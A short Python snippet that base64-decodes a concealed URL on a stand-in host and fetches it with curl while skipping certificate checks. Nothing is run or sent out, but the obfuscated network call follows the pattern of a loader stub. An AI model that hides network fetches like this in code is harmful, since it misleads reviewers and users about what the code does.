import subprocess
import base64

payload = base64.b64decode("aHR0cHM6Ly9leGFtcGxlLmNvbS9lZg==")
subprocess.run(["curl", "-k", payload.decode()])
